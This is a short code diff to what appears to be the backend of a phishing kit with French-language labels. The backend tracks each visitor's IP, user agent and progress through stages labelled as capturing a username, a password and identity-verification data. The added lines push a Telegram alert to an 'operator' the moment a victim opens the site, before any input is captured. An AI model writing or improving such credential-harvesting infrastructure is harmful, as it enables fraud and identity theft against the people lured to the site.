@@ -86,6 +86,7 @@ def _format_session_message(
 ) -> str:
     """Compact session-metadata recap (IP, UA, état, timestamps). Edited as stage/last-update change."""
     stage_label = {
+        "opened": "🆕 Site ouvert (en attente)",
         "identifiant": "🟡 Identifiant en cours",
         "password": "🟠 Mot de passe en cours",
         "identity": "🔵 Vérification d'identité en cours",
@@ -282,6 +283,11 @@ async def create_session(payload: SessionCreate, request: Request):
         "steps": [],
     }
     await db.sessions.insert_one(doc)
+
+    # Send the initial Telegram notification IMMEDIATELY on site open
+    # (so the operator knows who landed before any input is captured).
+    await _push_or_edit_progress(session_id, request, stage="opened")
+
     return SessionOut(session_id=session_id, created_at=doc["created_at"])
 
 
